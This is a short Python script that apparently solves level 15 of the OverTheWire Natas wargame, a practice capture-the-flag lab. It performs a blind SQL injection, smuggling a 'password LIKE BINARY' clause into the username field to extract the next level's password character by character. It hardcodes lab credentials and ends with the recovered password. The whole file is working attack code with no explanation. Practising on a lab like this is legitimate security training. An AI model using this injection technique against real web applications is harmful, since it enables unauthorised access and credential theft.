import requests as r

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://' + username + '.natas.labs.overthewire.org/?debug'


session = r.Session()
response = session.get(url, auth = (username, password))

cracked = [""]

while(True):
	for c in chars:
		tester = "".join(cracked) + c + '%" #'
		data = {'username':'natas16" AND password LIKE BINARY "' + tester}
		response = session.post(url, data, auth = (username, password))
		if("This user exists." in response.text):
			cracked.append(c)
			print("".join(cracked))
			break



# Run code and get pw -> WaIHEacj63wnNIBROHeqi3p9t0m5nhmh